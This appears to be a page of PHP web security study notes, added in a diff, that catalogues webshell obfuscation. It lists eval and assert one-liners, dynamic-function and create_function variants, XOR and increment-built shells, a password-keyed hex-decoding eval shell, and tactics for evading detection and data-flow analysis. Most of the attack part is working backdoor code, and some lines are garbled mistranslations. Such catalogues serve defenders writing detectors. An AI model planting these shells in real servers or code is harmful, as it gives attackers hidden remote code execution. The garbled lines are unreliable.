@@ -1,0 +1,287 @@
+
+
+<!DOCTYPE html>
+<html class="writer-html5" lang="en-US" data-content_root="../../">
+<head>
+  <meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>WebShell &mdash; Web Security Study Notes 1.0 documentation</title>
+      <link rel="stylesheet" type="text/css" href="../../_static/pygments.css?v=fa44fd50" />
+      <link rel="stylesheet" type="text/css" href="../../_static/css/theme.css?v=e59714d7" />
+
+  
+      <script src="../../_static/jquery.js?v=5d32c60e"></script>
+      <script src="../../_static/_sphinx_javascript_frameworks_compat.js?v=2cd50e6c"></script>
+      <script src="../../_static/documentation_options.js?v=4042127e"></script>
+      <script src="../../_static/doctools.js?v=9bcbadda"></script>
+      <script src="../../_static/sphinx_highlight.js?v=dc90522c"></script>
+    <script src="../../_static/js/theme.js"></script>
+    <link rel="index" title="Index" href="../../genindex.html" />
+    <link rel="search" title="Search" href="../../search.html" /> 
+</head>
+
+<body class="wy-body-for-nav"> 
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+
+          
+          
+          <a href="../../index.html" class="icon icon-home">
+            Web Security Study Notes
+          </a>
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../../search.html" method="get">
+    <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <p class="caption" role="heading"><span class="caption-text">Content index:</span></p>
+<ul>
+<li class="toctree-l1"><a class="reference internal" href="../../basic/index.html">1. Introduction</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../network/index.html">2. Computer network and protocol</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../info/index.html">3. Information collection</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../index.html">4. Language and framework</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../intranet/index.html">5. Intranet penetration</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../cloud/index.html">6. Cloud Security</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../defense/index.html">7. Defense Technology</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../auth/index.html">8. Authentication mechanism</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../tools/index.html">9. Tools and resources</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../manual/index.html">10. Quick manual check</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../../misc/index.html">11. other</a></li>
+</ul>
+
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../../index.html">Web Security Study Notes</a>
+      </nav>
+
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="Page navigation">
+  <ul class="wy-breadcrumbs">
+      <li><a href="../../index.html" class="icon icon-home" aria-label="Home"></a></li>
+      <li class="breadcrumb-item active">WebShell</li>
+      <li class="wy-breadcrumbs-aside">
+            <a href="../../_sources/language/php/webshell.rst.txt" rel="nofollow"> View page source</a>
+      </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+             
+  <section id="webshell">
+<h1>WebShell<a class="headerlink" href="#webshell" title="Link to this heading"></a></h1>
+<section id="common-deformations">
+<h2>Common deformations<a class="headerlink" href="#common-deformations" title="Link to this heading"></a></h2>
+<ul class="simple">
+<li><p>GLOBALS</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">eval($GLOBALS['_POST']['op']);</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">$_FILE</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">eval($_FILE['name']);</span></code></p></li>
+<li><p>Split</p></li>
+<li><p>`` <cite>Eval ($ {” _ after “.” Wed “} [‘sz’]);</cite> `</p></li>
+<li><p>Dynamic function execution</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">$k=&quot;ass&quot;.&quot;ert&quot;;</span> <span class="pre">$k(${&quot;_PO&quot;.&quot;ST&quot;}</span> <span class="pre">['sz']);</span></code></p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">$a=$_GET['a'];$a($_GET['b']);</span></code></p></li>
+<li><p>create_function</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">$function</span> <span class="pre">=</span> <span class="pre">create_function('$code',strrev('lave').'('.strrev('TEG_$').'[&quot;code&quot;]);');$function();</span></code></p></li>
+<li><p>preg_replace</p></li>
+<li><p>Deformation</p></li>
+<li><p>str_replace (“”, “e v a l”)</p></li>
+<li><p>Category conversion</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">&quot;\x62\x61s\x65\x36\x34_de\x63\x6fde&quot;</span></code></p></li>
+<li><p>Category operation</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">(&quot;#&quot;^&quot;|&quot;).(&quot;.&quot;^&quot;~&quot;).(&quot;/&quot;^&quot;`&quot;).(&quot;|&quot;^&quot;/&quot;).(&quot;{&quot;^&quot;/&quot;);</span></code></p></li>
+<li><p>Self-increasing operation</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">$a=&quot;a&quot;;$a++;</span></code></p></li>
+<li><p>Forced type conversion</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">$a='';$a.=[];</span> <span class="pre">//</span> <span class="pre">Array</span></code></p></li>
+</ul>
+<p>-Use file names
+- <code class="docutils literal notranslate"><span class="pre">__FILE__</span></code>
+- Comments
+- <code class="docutils literal notranslate"><span class="pre">$a=&quot;e&quot;.&quot;v&quot;./*-/*-*/&quot;a&quot;./*-*/&quot;l&quot;;</span></code>
+- Reflection
+- <code class="docutils literal notranslate"><span class="pre">ReflectionFunction</span></code></p>
+</section>
+<section id="bypass">
+<h2>Bypass<a class="headerlink" href="#bypass" title="Link to this heading"></a></h2>
+<ul class="simple">
+<li><p>Based on rare functions</p></li>
+<li><p><a href="#id1"><span class="problematic" id="id2">``</span></a>breeding_replacement_replacement.</p></li>
+<li><p>set_error_handler + trigger_error</p></li>
+<li><p>Based on pollution transmission</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">putenv($_GET[&quot;c&quot;]);eval(getenv('path'));</span></code></p></li>
+<li><p>parse_str</p></li>
+<li><p>Parese_url</p></li>
+<li><p>extract</p></li>
+<li><p>token_get_all</p></li>
+<li><p>define</p></li>
+<li><p>Based on rare sources</p></li>
+<li><p><code class="docutils literal notranslate"><span class="pre">$a</span> <span class="pre">=</span> <span class="pre">filter_input(INPUT_GET,'c');</span></code></p></li>
+<li><p>`` evales (end (number heads ())); `` `` ``</p></li>
+<li><p>get_defined_vars</p></li>
+<li><p>Tall Headers</p></li>
+<li><p>get_meta_tags</p></li>
+<li><p>phpinfo</p></li>
+<li><p>External variables/file information</p></li>
+<li><p>Overload toString</p></li>
+</ul>
+</section>
+<section id="string-deformation-function">
+<h2>String deformation function<a class="headerlink" href="#string-deformation-function" title="Link to this heading"></a></h2>
+<ul class="simple">
+<li><p>base64_decode</p></li>
+<li><p>base64_encode</p></li>
+<li><p>Str_replace</p></li>
+<li><p>str_rot13</p></li>
+</ul>
+<p>ash
+- strtolower
+- Strtoupper
+- Strtr
+- substr
+- substr_replace
+- trim
+- ucfirst
+- ucwords</p>
+</section>
+<section id="callback-function">
+<h2>Callback function<a class="headerlink" href="#callback-function" title="Link to this heading"></a></h2>
+<ul class="simple">
+<li><p>array_filter</p></li>
+<li><p>array_map</p></li>
+<li><p>array_reduce</p></li>
+<li><p>array_walk</p></li>
+<li><p>array_walk</p></li>
+<li><p>array_walk_recursive</p></li>
+<li><p>call_user_func</p></li>
+<li><p>call_user_func_array</p></li>
+<li><p>filter_var</p></li>
+<li><p>filter_ar array</p></li>
+<li><p>preg_replace_callback</p></li>
+<li><p>register_tick_function</p></li>
+<li><p>registregister_shutdown_function</p></li>
+<li><p>max</p></li>
+<li><p>Uksort</p></li>
+</ul>
+</section>
+<section id="encrypt-and-decrypt-functions">
+<h2>Encrypt and decrypt functions<a class="headerlink" href="#encrypt-and-decrypt-functions" title="Link to this heading"></a></h2>
+<ul class="simple">
+<li><p>mcrypt_encrypt</p></li>
+<li><p>openssl_encrypt</p></li>
+</ul>
+</section>
+<section id="other-ways-of-execution">
+<h2>Other ways of execution<a class="headerlink" href="#other-ways-of-execution" title="Link to this heading"></a></h2>
+<ul class="simple">
+<li><p>FFI</p></li>
+<li><p>SimpleXML</p></li>
+<li><p>SimpleXMLElement</p></li>
+</ul>
+</section>
+<section id="custom-functions">
+<h2>Custom functions<a class="headerlink" href="#custom-functions" title="Link to this heading"></a></h2>
+<p>Using custom encryption and decryption functions, some protection software can be bypassed to a certain extent. The following code is a simple example of hexadecimal execution.</p>
+<p>$string = ‘’;
+$password = ‘password’;
+if(isset($_POST[$password])){
+$hex = $_POST[$password];
+for($i = 0; $i &lt; strlen($hex) - 1; $i += 2) {
+$string .= chr(hexdec($hex[$i] . $hex[$i + 1]));
+}
+}
+eval($string);</p>
+</section>
+<section id="special-character-shell">
+<h2>Special character shell<a class="headerlink" href="#special-character-shell" title="Link to this heading"></a></h2>
+<p>PHP strings can directly perform operations when performing XOR and autoincrement operations, so special characters can be used to form a shell.</p>
+<p>&lt;? = `` {{$ {{{“{{” ~ “Send0 xb8 xba xb}`;</p>
+<p>&#64;$_++;
+$__=(“#”^”|”).(“.”^”~”).(“/”^”`”).(“|”^”/”).(“{“^”/”);
+&#64;${$__}[!$_](${$__}[$_]);</p>
+<p>$_=[];
+$_=&#64;”$_”; // $_=’Array’;
+$_=$_[‘!’==’&#64;’]; // $_=$_[0];
+$___=$_; // A
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
+$___.=$__; // S
+$___.=$__; // S
+$__=$_;
+$__++;$__++;$__++;$__++; // E
+$___.=$__;
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
+$___.=$__;
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
+$___.=$__;
+$____=’_’;
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
+$____.=$__;
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
+$____.=$__;
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
+$____.=$__;
+$__=$_;
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
+$____.=$__;</p>
+<p>$_=$$____;
+$___(base64_decode($_[_]));</p>
+</section>
+<section id="detect-confrontation">
+<h2>Detect confrontation<a class="headerlink" href="#detect-confrontation" title="Link to this heading"></a></h2>
+<ul class="simple">
+<li><p>Analysis based on obfuscation impact program</p></li>
+<li><p>Influence program execution based on dynamic variables</p></li>
+<li><p>Throw an exception to interrupt data flow analysis</p></li>
+<li><p>Reflection-based interruption data flow analysis</p></li>
+<li><p>Interrupt data flow analysis based on reference delivery</p></li>
+</ul>
+</section>
+</section>
+
+
+           </div>
+          </div>
+          <footer>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>&#169; Copyright 2025-2025, Lyle.</p>
+  </div>
+
+  Built with <a href="https://www.sphinx-doc.org/">Sphinx</a> using a
+    <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a>
+    provided by <a href="https://readthedocs.org">Read the Docs</a>.
+   
+
+</footer>
+        </div>
+      </div>
+    </section>
+  </div>
+  <script>
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script> 
+
+</body>
+</html>
